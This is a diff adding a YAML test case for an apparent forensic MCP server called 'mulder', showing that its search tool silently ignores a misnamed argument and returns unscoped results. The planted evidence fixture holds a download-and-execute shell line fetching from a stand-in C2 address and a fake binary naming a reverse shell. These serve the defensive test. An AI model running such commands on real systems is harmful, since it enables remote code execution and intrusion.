@@ -1,0 +1,62 @@
+# Matrix case P2060-012: mulder's MCPServer argument models do not forbid
+# extra keys, so an argument name the tool does not define is dropped without
+# an error and the tool runs with its default.
+case_id: P2060-012
+problem: P2060
+server: mulder
+variant: mulder-3164843
+commit: 3164843baf74c7fe69e7121dbd6150f8f77ce660
+display: multi-call
+level: mcp
+realism: possible
+realism_ko: "mulder 응답의 결과 항목과 `get_raw_output`은 출처를 `source_name`으로 부르므로, `search`에도 같은 이름으로 출처를 주는 일이 있을 수 있다."
+coverage: "partial: one tool (search) and one misnamed argument are shown; the cause is in the shared argument model and applies to every tool"
+coverage_ko: "도구 하나(`search`)와 잘못된 인자 이름 하나만 보인다. 원인은 모든 도구가 함께 쓰는 인자 모델에 있다."
+summary: search(query="203.0.113.7", source_name="hashdeep.hashes") drops the undefined source_name argument without an error and returns success with matches from strings.output as well, so the requested scope is not applied.
+summary_ko: "`search(query=\"203.0.113.7\", source_name=\"hashdeep.hashes\")`는 정의에 없는 `source_name`을 오류 없이 버리고, 범위를 좁히지 않은 채 `strings.output`의 결과까지 success로 돌려준다."
+defect_ko: "이 서버는 정의에 없는 인자 이름을 알리지 않고 버리고 기본값으로 실행한다. 정상이라면 모르는 인자라고 오류를 내야 한다. 모델은 요청한 출처 안에서만 찾은 결과로 잘못 안다."
+setup_ko: "C2 주소 `203.0.113.7`이 든 셸 스크립트와 이를 내려받는 바이너리를 증거에 넣고, `run_strings`와 `run_hashdeep`으로 두 출처를 색인했다."
+fixture:
+  - path: payload/update.sh
+    text: |
+      #!/bin/sh
+      curl -s http://203.0.113.7/k -o /tmp/.k && chmod +x /tmp/.k && /tmp/.k
+  - path: payload/203.0.113.7_k.bin
+    text: "ELF\nconnect_back 203.0.113.7:4444\n/bin/sh -i\n"
+steps:
+  - tool: scan_evidence
+    note_ko: "준비: 사건 생성"
+    args:
+      evidence_path: ${EVIDENCE}
+      case_id: p2060-012
+  - tool: run_strings
+    note_ko: "준비: 문자열 색인(strings.output)"
+    args:
+      target_path: ${EVIDENCE}/payload/update.sh
+  - tool: run_hashdeep
+    note_ko: "준비: 해시 색인(hashdeep.hashes)"
+    args:
+      target_path: ${EVIDENCE}/payload
+  - tool: search
+    note_ko: "결함 호출: 출처를 `source_name`으로 지정한 검색"
+    args:
+      query: 203.0.113.7
+      source_name: hashdeep.hashes
+  - tool: search
+    note_ko: "비교 호출: 정의된 이름 `source`로 지정한 검색"
+    args:
+      query: 203.0.113.7
+      source: hashdeep.hashes
+expect:
+  - step: 4
+    note_ko: "정의에 없는 인자인데 오류 없이 성공한다"
+    contains: '"status": "success"'
+  - step: 4
+    note_ko: "요청한 출처 밖(`strings.output`)의 결과가 섞여 온다"
+    contains: '"source_name": "strings.output"'
+  - step: 4
+    note_ko: "응답의 범위는 지정되지 않은 값(null)이다"
+    contains: '"source": null'
+  - step: 5
+    note_ko: "정의된 이름으로 주면 `strings.output` 결과가 없다"
+    not_contains: '"source_name": "strings.output"'
